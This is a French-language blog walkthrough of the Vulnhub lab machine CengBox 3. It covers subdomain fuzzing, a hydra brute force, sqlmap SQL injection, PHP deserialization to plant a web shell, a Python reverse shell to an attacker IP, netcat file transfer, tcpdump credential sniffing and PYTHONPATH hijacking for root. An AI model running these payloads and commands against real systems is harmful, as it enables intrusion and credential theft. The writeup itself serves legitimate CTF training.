---
layout: default
title: "Writeup CengBox: 3 - Vulnhub"
date:   2020-12-28 10:00:00 +0200
published: true
---

# Informations sur la box :

* **Difficulté** : Intermédiaire / Difficile
* **Description** : *Some of us hold on to poems, songs, movies, books. I guess people can't hold onto people anymore. -- Oguz Atay                                                                    
You know what you have to do. If you get stuck, you can get in touch with me on Twitter. @arslanblcn_*
* **Type de fichier** : .ova (VirtualBox)
* **DHCP** : Activé
* **Lien** : [https://www.vulnhub.com/entry/cengbox-3,576/](https://www.vulnhub.com/entry/cengbox-3,576/)


### Ce que nous allons aborder dans ce writeup :

*	[Énumération](#énumération)
* 	[Virtual Host fuzzing](#virtual-host-fuzzing)
*	[Admin panel via brute force](#admin-panel-via-brute-force)
*   [Admin panel via SQL Injection](#admin-panel-via-sql-injection)
*   [Shell basique](#shell-basique)
*   [Privesc utilisateur](#Privesc-utilisateur)
*   [Privesc root - 1ère méthode](#privilege-escalation-méthode-1)
*   [Privesc root - 2ème méthode](#privilege-escalation-méthode-2)
*   [Conclusion](#conclusion)

* * *

## Énumération
* * *

Comme à chaque début de box il faut trouver son adresse IP avec ``nmap`` en utilisant l'option ``-sP`` (**Ping Scan**) :

```bash
nmap -sP 192.168.1.0/24
```

On obtient l'IP : **192.168.1.109**

On va donc énumérer les services et ports ouverts sur la machine à attaquer :

```bash
nmap -p- 192.168.1.109 -A --min-rate 5000
```

* **-p-** : On scan TOUS les ports
* **-A** : Mode aggressif
* **--min-rate 5000** : Définit le nombre d'envoi de paquets par secondes

Pour plus d'informations vous pouvez consulter le ``man`` de nmap.

Voici les informations que l'on obtient :

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Agency
443/tcp open   ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Agency
| ssl-cert: Subject: commonName=ceng-company.vm/organizationName=Ceng Company/stateOrProvinceName=\xC3\x84Istanbul/countryName=TR
| Not valid before: 2020-09-24T14:25:07
|_Not valid after:  2021-09-24T14:25:07
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
``` 
On se rend compte que ce sont les **ports basiques** qui sont ouverts. Aucun port exotique. On remarque aussi que **SSH** port **22** est fermé et donc que le shell s'obtiendra exclusivement via la partie web.


Un site web tourne sur la machine sur le port **80**. 

On va se rendre dessus via le navigateur mais avant on lance un fuzzing de directory pour voir si on trouve des choses utiles :

```bash
ffuf -u http://192.168.1.109/FUZZ -w /usr/share/dirb/wordlists/directory-list-2.3-big.txt -e .php,.txt,.html
```

On recherche également de potentiels fichiers qui auraient pour **extension .php, .txt et .html** avec l'option ``-e``.

```
index.html              [Status: 200, Size: 35995, Words: 2110, Lines: 814]
img                     [Status: 301, Size: 318, Words: 20, Lines: 10]
css                     [Status: 301, Size: 318, Words: 20, Lines: 10]
js                      [Status: 301, Size: 317, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 320, Words: 20, Lines: 10]
poem.txt                [Status: 200, Size: 5, Words: 1, Lines: 1]
```

Les pages et répertoires trouvés ne semblent pas d'être d'un grand intérêt. 

Seul **poem.txt** paraît un peu **suspect** mais on y reviendra plus tard. Il ne contient que *Test1* et pas de possibilité d'intéragir avec puisse que c'est un ``.txt``.

Il existe exactement le **même site** mais sur le **port 443** avec **SSL**. La première faille qui m'est venue à l'esprit était **Heartbleed** qui est une vulnérabilité impactant SSL et dans les CTFs quand on tombe sur du SSL c'est pas étonnant d'en trouver. Mais ici ce n'est pas le cas.

Un petit scan avec **Metasploit** nous indique que la cible n'est **pas vulnérable** à cette attaque. A savoir que j'ai utilisé Metasploit pour la simplicité et rapidité mais il existe également d'autres scripts qui font le même travail.

```bash
msfconsole #On lance d'abord le Framework Metasploit
```

```bash
use auxiliary/scanner/ssl/openssl_heartbleed #On choisit le module
set RHOSTS 192.168.1.109 #On spécifie l'adresse de la cible
run #On lance le scan
```

J'ai également tenté du fuzzing web sur le site en **HTTPS** mais les **mêmes résultats** que pour le port 80 ressortent.

Comme le site est en **HTTPS** on peut aller inspecter son **certificat**. On trouve alors cette ligne :

```
Common Name : ceng-company.vm
```

Ça ressemble quand même beaucoup à un **nom de domaine**. Je l'ai donc ajouté au fichier ``/etc/hosts`` de ma machine et j'ai tenté d'accéder de nouveau au site sur les deux ports non plus via l'IP de la box mais par ce nom de domaine. Malheureusement **aucun changement** n'a été apperçu. J'ai même tenté de relancer un fuzzing avec ``fuff`` sur les deux sites mais rien de plus.


Après avoir tourné pas mal de temps j'ai décidé de retourner inspecter plus **en profondeur** le site web.

Au niveau de la présentation de l'équipe lorsqu'on passe la souris sur la photo des personnes, les **réseaux sociaux** apparaissent. Certains sont inexistant mais d'autres nous amènent vers des choses intéressantes.

Notamment **Eric Thompson** qui permet d'accéder à son [compte Github](https://github.com/arslanblcn/PHP-OOP) mais aussi **Elizabet Sky** qui possède un compte [Reddit](https://www.reddit.com/user/ElizabethSky_)


Sur le profil Reddit on a accès à un **poème** écrit par **Nazim Hikmet**. On sait qu'on a accès à ``poem.txt`` sur le site web. Peut-être qu'il y aura quelque chose à faire avec ces deux choses.

Le poème est le suivant :

```
[POEM]The Walnut Tree

   My head foaming clouds, sea inside me and out   I am a walnut tree in Gulhane Park   an old walnut, knot by knot, shred by shred   Neither you are aware of this, nor the police

   I am a walnut tree in Gulhane Park   My leaves are nimble, nimble like fish in water   My leaves are sheer, sheer like a silk handkerchief   pick, wipe, my rose, the tear from your eyes   My leaves are my hands, I have one hundred thousand   I touch you with one hundred thousand hands, I touch Istanbul   My leaves are my eyes, I look in amazement   I watch you with one hundred thousand eyes, I watch Istanbul   Like one hundred thousand hearts, beat, beat my leaves

   I am a walnuttree in Gulhane Park   neither you are aware of this, nor the police

Nazim Hikmet
```
Encore une fois on reviendra dessus **plus tard** car on ne sait pas quoi en faire pour le moment.

Concernant le Github de notre ami Eric on peut y retrouver des choses **très intéressantes**. <br>
Premièrement le **README.md** indique ceci :

```
Hint for CengBox3 -- namelastname@ceng-company.vm
```

Ce qui nous indique que nous sommes sur la bonne piste. On peut aussi voir la **structure d'une adresse mail** pour l'entreprise qui possède le site web.
De ce fait, par exemple le mail d'Eric sera ``ericthompson@ceng-company.vm`` et celui D'Elizabeth ``elizabethsky@ceng-company.vm``.

Un **code PHP** est également présent :

```php
<?php
    class poemFile
    {
        public function __destruct()
        {
            file_put_contents($this->filename, $this->poemName, FILE_APPEND);
        }
    }

    class Poem
    {
        public $poemName;
        public $isPoetrist;
        public $poemLines;

        public function printData()
        {
            if($this->isPoetrist){
                echo $this->poemName . "\n";
                echo $this->poemLines . "\n";
                echo "\n Poem has been added!";
            } else {
                echo $this->poemName ." is not a poem\n";
            }
        }
    }
    $object = unserialize(urldecode($_REQUEST['data']));
    $object->printData();
?>
```

On observe dans ce code qu'il y a de la **désérialisation** sans **aucune mesure de sécurité** au niveau de la donnée. Donc potentiellement un **vecteur d'attaque** de ce côté.<br><br>
On voit aussi qu'il y a **deux classes**. <br><br>
La première *poemFile* utilise la fonction ``__destruct()`` qui sera appelée lors de la destruction de l'objet. A ce moment cette fonction va insérer dans le fichier ``filename`` le nom du poème (``poemName``). Ces données seront sûrement récupérées depuis l'objet qui sera passé à ce fichier. <br><br>
La deuxième classe *Poem* vérifie simplement que le champ ``isPoetrist`` n'est **pas vide** et va afficher un message en fonction.

Ce sera sûrement un morceau de code à **exploiter**.

On garde ces infos de côté pour plus tard et on continue notre **énumération**. <br>

J'ai décidé de chercher sur **Google** le pseudo ``ElizabethSky_`` pour voir si on ne pouvait pas récupérer des infos en plus. Je suis tombé sur un compte [Twitter](https://twitter.com/elizabethsky_) avec des messages étranges mais c'est sûrement une fausse piste.

J'ai été un peu curieux et au lieu de me contenter du repository Github qu'on m'avait donné je suis allé voir dans les autres disponibles et je suis tombé sur [**celui-ci**](https://github.com/arslanblcn/PhpLogin).<br>

En regardant les fichiers je suis tombé sur des choses plutôt intéressantes :<br>

**setup.php**
```php
$passwd = md5("Sup3rS3cr3tPasswd!");
$insertQuery = "INSERT INTO users (name, email, passwd) VALUES ('John Doe', 'johndoe@example.com', '$passwd'),
                ('Elizabeth Sky', 'elizabethsky@example.com', '$passwd')";
```

On retrouve bien notre amie Elizabeth Sky avec un **mot de passe stocké** dans la base de données. Ce sera peut-être utile pour plus tard.<br>

**conn.php**
```php
$server = "localhost";
$db_user = "elizabeth";
$db_passwd = "elizabeth";
$db_name = "cengbox";
```

Qui indique le nom d'utilisateur et le mot de passe pour se connecter à la base de données.

**login.php**
```php
if(isset($_POST['username']) && isset($_POST['passwd'])){

    $username = validate($_POST['username']);
    $passwd = validate($_POST['passwd']);
    $passwd = md5($passwd);

    $query=$conn->prepare("SELECT * FROM users WHERE email= ?");
    $query->bind_param("s", $_POST['username']);
    $query->execute();
    $result = $query->get_result();
    $users = $result->fetch_assoc();
```

Ici on pourrait avoir une SQLi ? Aussi à garder pour plus tard.


* * *

## Virtual Host fuzzing
* * *

A cet instant j'étais un peu bloqué puisque j'avais pas mal d'informations mais rien de concret à exploiter sur aucun des deux sites web.

Grâce à une aide extérieure, on m'a donné comme indice de regarder du côté des **hôtes virtuels**.

J'ai donc cherché sur Internet et je suis tombé sur ce [très bon article](https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing/) qui expliquait les différents fuzzing possibles avec **Gobuster**.<br>

On peut y avoir un mode **VHOST** qui correspond à Virtual Host. C'est ce qu'on cherche !<br>

Tout d'abord petit point sur ce qu'est un Virtual Host. <br>

Comme nous l'indique très bien la [documentation officielle d'Apache](https://httpd.apache.org/docs/2.4/vhosts/), il s'agit de faire fonctionner **plusieurs serveurs web sur une même machine**. 
En effet, un serveur web ne possède qu'une adresse IP et donc en théorie on ne peut avoir qu'une seule version d'un site sur celui-ci. Les VHOSTS sont là pour remédier à ce problème. On accèdera donc à ces différents sites via un **nom de domaine différent**.

**Attention** cependant à ne pas confondre le **fuzzing DNS** avec le **fuzzing VHOST**.<br>

Dans le premier cas l'outil va essayer de **résoudre le sous domaine** tandis que dans le second il va essayer d'accéder à l'URL pour **vérifier que l'adresse IP est identique**.<br>

Seulement, l'article ne parle que de ``Gobuster`` et j'utilise ``fuff``. Donc j'ai cherché s'il était possible de faire la même chose et la réponse est **oui** :

```bash
/opt/ffuf/ffuf -u http://ceng-company.vm/ -H "Host: FUZZ.ceng-company.vm" -w /usr/share/wordlists/directory-list-2.3-big.txt -fs 35995
```

- **-H** permet de spécifier le *Header* dans lequel on va indiquer le champ à fuzz. Il sera donc remplacé par chaque mot de la wordlist.
- **fs** permet de filtrer la taille de la réponse HTTP. Avec le premier ``ffuf`` au départ on avait l'``index.html`` qui avait une taille de *35995*. Donc on va exclure tous les VHOSTS qui n'ont pas une taille identique.

Finalement on se retrouve avec : 

```
dev                     [Status: 200, Size: 4764, Words: 124, Lines: 99]
```

Ce qui signifie qu'on a trouvé un hôte virtuel grâce au fuzzing, qui va nous permettre d'accéder à un autre site sur le même serveur.<br>

Il nous suffit de l'ajouter au fichier ``/etc/hosts`` tout comme on l'avait fait au début. Voilà à quoi ressemble la ligne correspondante :

```
192.168.1.109   ceng-company.vm  dev.ceng-company.vm
```

On peut maintenant y accéder avec ``http://dev.ceng-company.vm/``.<br>

On se retrouve sur une page de **login**. Pour voir comment elle réagissait j'ai essayé de me connecter avec *admin:admin*, mais c'était à prévoir, ça n'a pas fonctionné.<br>

Cependant on peut voir un message d'erreur ``Incorret username or password``. On remarque qu'il est également indiqué dans l'URL.
J'ai donc tenté d'y **injecter du code javascript** pour voir s'il était vulnérable aux **XSS**: 

```
http://dev.ceng-company.vm/index.php?error=<script> alert("xss");</script>
```

Effectivement une pop-up apparaît bien à l'écran. Cependant on ne peut pas faire gran chose avec une **reflected XSS**.

* * *

## Admin panel via brute force
* * *

La première option qui n'est pas la plus fun est de tenter un brute force sur la page de login en espérant trouver la bonne combinaison.

On connait la forme des adresses mail grâce au ``hint`` trouvé sur **Github**.
On connait également le nom des personnes de l'équipe qui travaillent dans l'entreprise.<br>

On pourrait donc tenter un brute force sur les adresses mail avec une grosse wordlist style ``rockyou``. Le problème c'est le **temps** que ça va prendre.<br>

Il ne faut pas oublier qu'on a un poème trouvé sur **Reddit** qui ne nous a pas servi à grand chose pour le moment. Est-ce qu'on pourrait pas s'en servir pour générer de potentiels mot de passe ? *(Nous sommes dans un CTF après tout :p)*.

On va reprendre le poème qu'on a stocké dans un fichier nommé ``reddit_poem.txt`` et on va y **appliquer des modifications** pour en faire une wordlist utilisable :

```bash
cat reddit_poem.txt| sed 's/[ ,\t]/\n/g' | sed '/^$/d' | sort | uniq > custom_wordlist.txt
```

Cette commande va récupérer le contenu du fichier, remplacer toutes les ``,`` et tabulations par un retour à la ligne pour avoir un mot par ligne.
On va ensuite enlever toutes les lignes vides et retirer les doublons. On redirige maintenant vers un nouveau fichier ``custom_wordlist.txt``.

Maintenant qu'on a notre wordlist personnalisée on va pouvoir tenter le brute force.

Nous avons donc 4 mails *(qu'on va aussi placer dans un fichier ``users.txt``)*:

```
ericthompson@ceng-company.vm
rodneycooper@ceng-company.vm
johndoe@ceng-company.vm
elizabethsky@ceng-company.vm
``` 

```bash
hydra -L users.txt -P custom_wordlist.txt dev.ceng-company.vm http-post-form "/login.php:username=^USER^&passwd=^PASS^:F=Incorret username or password" -t 64 -V
```

Avec **hydra** on spécifie la liste des utilisateurs, la wordlist de mots de passe, la cible (dans notre cas le nom de domaine), le type de formulaire (*POST*), la page de login avec les paramètres ainsi que le message d'erreur lorsque les credentials sont incorrects. On précise aussi **-t 64** pour spécifier le nombre de threads et augmenter la rapidité du brute force.

```
[80][http-post-form] host: dev.ceng-company.vm   login: elizabethsky@ceng-company.vm   password: walnuttree
```

Le mot de passe **walnuttree** est également présent dans ``rockyou`` mais ça aurait été beaucoup trop long de tout tester.<br>

Mais avant de se connecter avec les identifiants on peut utiliser une autre technique pour les récupérer.


* * *

## Admin panel via SQL injection
* * *

L'autre technique est donc d'utiliser une injection SQL via le formulaire de login de la page.

Pour se faire rien de plus simple, il suffit de lancer BurpSuite, de faire une requête sur cette même page de login. On devrait intercepter la requête suivante :

```
POST /login.php HTTP/1.1
Host: dev.ceng-company.vm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://dev.ceng-company.vm
Connection: close
Referer: http://dev.ceng-company.vm/
Upgrade-Insecure-Requests: 1

username=test%40test.test&passwd=test
```

A préciser qu'ici le ``username`` et ``passwd`` ne sont pas importants, c'est juste pour pouvoir capturer la requête.

On va ensuite utiliser l'outil ``sqlmap`` pour tenter d'effectuer une injection SQL sur la page de login.

L'utilisation principale de cet outil se fait généralement en donnant une URL avec des paramètres définis comme par exemple :

```
sqlmap -u "http://random-wesbite.com/index.php?id=test"
```

Mais on peut aussi utiliser l'option ``--forms`` qui permet de spécifier uniquement la page souhaitée et qui va chercher **automatiquement** tous les formulaires contenus dans la page.

Vu qu'on ne va pas spécifier d'URL, on va utiliser l'option ``-r`` qui va nous permettre de passe à ``sqlmap`` un fichier texte qui contient la requête à effectuer.

Pour récupérer ce fichier il suffit sur BurpSuite de faire un clic droit sur la requête puis de sélectionner "Save Item" et de l'enregistrer dans un fichier.

Le fichier est un document XML qui contient toutes les informations de la requête.

Voici un exemple de son contenu :

```
<items burpVersion="2020.11.3" exportTime="Sun Dec 27 14:02:53 CET 2020">
  <item>
    <time>Sun Dec 27 13:04:49 CET 2020</time>
    <url><![CDATA[http://dev.ceng-company.vm/login.php]]></url>
    <host ip="192.168.1.109">dev.ceng-company.vm</host>
    <port>80</port>
    <protocol>http</protocol>
```

On va ensuite le passer à ``sqlmap`` avec la commande suivante :

```bash
sqlmap -r sqlmap.txt --dbs --tamper=between
```

- **-r** pour lire la requête HTTP depuis un fichier
- **--dbs** permet de lister les bases de données
- **--tamper** permet de temporiser entre chaque requête. Cette option est directement recommandée par sqlmap.

Un fois qu'on a récupéré la liste des bases de données du site on peut affiner notre recherche pour n'afficher que les champs de la table qui nous intéressent :

```bash
sqlmap -r sqlmap.txt -D cengbox -U users --dump --tamper=between
```

```
+----+-------+------------------------------+-------------+
| id | name  | login                        | password    |
+----+-------+------------------------------+-------------+
| 1  | Admin | admin@ceng-company.vm        | admin*_2020 |
| 2  | Admin | elizabethsky@ceng-company.vm | walnuttree  |
+----+-------+------------------------------+-------------+
```

On a donc récupéré les logins pour se connecter au panel admin ainsi que les mots de passe en clair.

Après avoir fait des tests on se rend compte que les deux utilisateurs possèdent les droits administrateurs. Il n'y a donc pas d'importance dans le choix du compte avec lequel on va se connecter.



* * *

## Shell basique

On a maintenant accès à une page qui nous permet d'ajouter des poèmes.

Si on tente d'en ajouter un pour voir comment le site réagit on obtient l'URL suivante :

```
http://dev.ceng-company.vm/addpoem.php?data=O%3A4%3A%22Poem%22%3A3%3A%7Bs%3A8%3A%22poemName%22%3Bs%3A5%3A%22shell%22%3Bs%3A10%3A%22isPoetrist%22%3BO%3A8%3A%22poemFile%22%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A22%3A%22%2Fvar%2Fwww%2Fhtml%2Fpoem.txt%22%3Bs%3A8%3A%22poemName%22%3Bs%3A5%3A%22shell%22%3B%7Ds%3A9%3A%22poemLines%22%3Bs%3A21%3A%22%3C%3Fphp+echo+%22test%22%3B+%3F%3E%22%3B%7D
```

Cependant elle est encodée. On va donc utiliser un décodeur en ligne pour retrouver une URL plus lisible :

```
http://dev.ceng-company.vm/addpoem.php?data=O:4:"Poem":3:{s:8:"poemName";s:5:"shell";s:10:"isPoetrist";O:8:"poemFile":2:{s:8:"filename";s:23:"/var/www/html/poem.txt";s:8:"poemName";s:5:"shell";}s:9:"poemLines";s:21:"shell";}
```

On peut ensuite retourner sur la page ``http://ceng-company.vm/poem.txt`` pour visualiser le poème qu'on vient d'ajouter.

On peut voir plusieurs champs intéressants dans le *json* qui est envoyé via l'URL. Notamment le chemin où est enregistré le poème.

Il suffit de modifier l'URL à plusieurs reprises avec des champs différents pour savoir quel est le contenu qui est enregistré dans le fichier. 

On s'aperçoit que c'est le second champ nommé **poemName** qui est inséré dans lke fichier. 

Grâce à ces informations on va pouvoir tenter d'ajouter au fichier des données qui nous permettent d'obtenir un shell sur la machine cible.


De ce fait, si on tente par exemple d'écrire du texte dans un autre fichier que poem.txt alors on pourra y accéder.

Attention cependant, lors du changement des données dans l'URL il faut bien faire attention de changer également la taille de la chaine spécifier par ``s:TAILLE``.

On va donc essayer d'insérer du code php dans un fichier qu'on nommera ``shell.php`` pour pouvoir exécuter du code :

```
http://dev.ceng-company.vm/addpoem.php?data=O:4:"Poem":3:{s:8:"poemName";s:5:"shell";s:10:"isPoetrist";O:8:"poemFile":2:{s:8:"filename";s:23:"/var/www/html/shell.php";s:8:"poemName";s:42:"<?php system($_GET['cmd']);?>";}s:9:"poemLines";s:21:"shell";}
```

On se retrouve alors avec le chemin : ``/var/www/html/shell.php`` et ce qui va être écrit dans le fichier : ``<?php system($_GET['cmd']);?>``.

Si on tente de se rendre à l'URL ``http://ceng-company.vm/shell.php`` et qu'on ajoute le paramètre ``cmd=COMMAND`` en remplaçant **COMMAND** par la commande à exécuter alors on voit bien qu'on arrive à communiquer directement avec le serveur.

```
http://ceng-company.vm/shell.php?cmd=id
```
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


On peut alors obtenir un shell sur la machine grâce au reverse shell suivant (il faut bien se mettre en écoute sur notre machine auparavant) : 

```
http://ceng-company.vm/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.91",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Attention** il faut bien remplacer l'adresse IP ainsi que le port en fonction de vous.


* * *

## Privesc utilisateur

Pour avoir un shell un peu plus fonctionnel et propre on peut spawn un shell bash grâce à ``python3`` :

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Si on regarde le fichier ``/etc/passwd`` on voit bien qu'il n'y a qu'un seul utilisateur sur la machine :

```
eric:x:1000:1000:eric,,,:/home/eric:/bin/bash
```

On peut tenter de chercher tous les fichiers qui appartiennent à cet utilisateur :

```bash
find / -user eric 2>/dev/null
```

Et on trouve le fichier ``/opt/login.py`` mais on n'a pas les droits nécessaires pour y accéder.

Avec un :

```bash
netstat -nutelap 
```

On peut voir que la base de données ``MySQL`` tourne en local.

Après avoir fouillé dans les fichiers du site web, on tombe sur des indentifiants plutôt intéressants :

```
/var/www/dev.ceng-company.vm/conn.php
```
```
$db_user = "elizabeth";
$db_passwd = "3liz4B3TH2020!Covid19";
```

On tente alors de s'y connecter avec ce qu'on vient de trouver :

```bash
mysql -u elizabeth -p -> 3liz4B3TH2020!Covid19
```

Malheureusement ça ne fonctionne pas.


Si on regarde les capabilities sur la machine on se retrouve avec :

```bash
getcap -r / 2>/dev/null
```
```
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
```

Ce qui signifie qu'on peut lancer ``tcpdump`` avec les droits administrateur.

On va donc tenter d'écouter le réseau pour voir de potentiels paquets intéressants.

Il nous faut d'abord lister toutes les interfaces disponibles pour savoir sur laquelle il faut écouter :

```bash
tcpdump -D
```

On va tout écouter sauf notre machine puisqu'elle envoie beaucoup trop de données qui parasitent la capture et qui ne servent à rien :

```bash
tcpdump -i any -s0 "host not 192.168.1.91" -w /tmp/result.pcap
```

- **-i** permet de spécifier l'interface sur laquelle on écoute. Ici on écoute sur tout
- **-s0** permet de capturer les paquets dans leur entièreté sans qu'ils soient tronqués et donc illisibles.
- **"host not 192.168.1.91"** comme sur ``Wireshark`` on peut spécifier des filtres. Ici on ne veut pas notre machine attaquante.
- **-w** va écrire les résultats dans un fichier ``.pcap`` pour ensuite pouvoir le lire de manière plus fluide directement sur ``Wireshark``.


Après avoir écouté plusieurs minutes, on stop ``tcpdump`` et on transfert le fichier qui contient les échanges réseau sur notre machine hôte pour l'analyser :

```
Côté attaquant : nc -lnvp 6666 > "result.pcap"
Côté cible : nc 192.168.1.91 6666 < "result.pcap"
```

Sur ``Wireshark`` on peut apercevoir une **requête HTTP** intéressante :

```
username=eric&password=3ricThompson%2ACovid19
```

En effet, elle contient des identifiants qui transitent en clair directement sur le réseau.

Si on tente de se connecter sur la machine cible à l'utilisateur ``eric`` avec le mot de passe ``3ricThompson*Covid19`` (attention à bien décoder %2A) on réussi !

```bash
cat /home/eric/user.txt
```
```
If someone asks us when we die tomorrow: ‘What have you seen in the world? If he said, we probably cannot find the answer to give. We don't have time to see it from running. -- Sabahattin Ali

flag(6744e509eec439570c2d6df947526749)
```

## Privesc root méthode 1

Ici c'est la méthode la plus **badass** pour passer root. On verra ensuite une autre méthode beaucoup plus simple.

Maintenant que nous sommes connectés en tant qu'``eric`` on a accès à de nouveaux fichiers :

```
/opt/login.py :

import requests
creds = {'username':'eric','password':'3ricThompson*Covid19'}
r = requests.post('http://localhost',data = creds)
print(r.text)
```

Ce sont les identifiants trouvés via ``tcpdump`` donc ce n'est plus utile.

```
/opt/check.sh :

#!/bin/bash
/usr/bin/python3 /opt/whatsmyip.py
```

C'est un script bash qui va juste lancer le fichier ``/opt/whatsmyip.py`` avec ``python3``.


```
/opt/whatsmyip.py :

import requests
r = requests.get(r'http://jsonip.com')
ip= r.json()['ip']
print('Your IP is {}'.format(ip))
```

On a un fichier python qui va faire une requête sur un site web pour récupérer notre adresse IP publique. On garde ça de côté pour apprès.

En continuant l'énumération on s'aperçoit que l'utilisateur a des droits ``sudo`` spécifiques :

```bash
sudo -l
```
```
(ALL : ALL) SETENV: NOPASSWD: /opt/check.sh
```

Ici l'utilisateur peut lancer le script ``/opt/check.sh`` en tant que root en ayant en plus la possibilité de modifier les variables d'environnement lors de l'exécution de celui-ci.


La faille vient du fichier python et plus précisément de la ligne :

```
import requests
```

En effet, il est possible de modifier le répertoire de base de python pour qu'il aille chercher dans un autre répertoire. Dans ce répertoire onj va créer un fichier qui contient du code malicieux et on va le nommer ``requests.py``. 

De ce fait ce sera notre ``requests.py`` qui sera appelé à la place de celui légitime.

Le nom de cette vulnérabilité est **Python Library Hijacking**.

* * *

#### Petit bonus :  

Si vous voulez connaître le répertoire par défaut dans lequel tous les scripts se trouvent :

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

Il faut maintenant trouver le nom de la variable d'environnement qui permet de définir le chemin vers le répertoire par défaut des librairies de python.

Après quelques rechercent sur Internet, on trouve qu'il s'agit de la variable **PYTHONPATH**.

On va donc créer un nouveau fichier nommé ``requests.py`` dans le répertoire ``/tmp`` et qui va contenir le code pour obtenir un shell root :

```bash
echo 'import os; os.system("/bin/bash")' > /tmp/requests.py
```

On lance ensuite les commandes suivantes pour exécuter le script en passnt également notre variable ``PAYHTONPATH`` modifiée :

```bash
export PYTHONPATH=/tmp/
sudo --preserve-env /opt/check.sh 
```

Ici on modifie d'abord la variable puis on indique l'option ``--preverse-env`` de sudo pour que les variables d'environnement restent les mêmes lorsqu'elles sont exécutées via un autre utilisateur.

On peut aussi spécifier uniquement la variable à remplacer :

```bash
sudo PYTHONPATH=/tmp/ /opt/check.sh
```

On obtient donc notre shell en tant que root !

```bash
cat /root/proof.txt
```
```
flag(058004ef45a08082100802d41fdcc290)
```


## Privesc root méthode 2

Autre méthode possible pour passer root : il suffit de lancer l'outil ``pspy64`` pour écouter en local tous les processus qui sont lancés :

```
2021/01/16 18:13:01 CMD: UID=0    PID=2394   | /usr/bin/python3 /opt/login.py
```

On voit bien ici que le script ``/opt/login.py`` qui envoie des données sur le réseau est exécuté en tant que root. 

Heureusement on a les droits de modification sur ce fichier en étant connecté avec ``eric`` :

```bash
ls -la /opt/login.py
```
```
-rwx------  1 eric eric  143 Sep 28 13:28 login.py
```

On peut alors modifier le fichier python pour y ajouter un reverse shell par exemple et donc attendre quelques instants pour recevoir la connexion et donc passer root !


* * *

## Conclusion

Cette box fait partie de mes box **préférées** faites jusqu'à présent. Elle est plutôt réaliste et ça a été unn vrai plaisir pour moi de la faire.

Merci à vous qui êtes arrivés jusqu'ici !

Un grand merci également au créateur de la box. Vous pouvez le retrouver sur Twitter : [@arslanblcn_](https://twitter.com/arslanblcn_).


Me concernant vous pouvez me retrouver également sur [Twitter](https://twitter.com/ZworKrowZ) ou sur mon serveur [Discord](https://discord.gg/v6rhJay)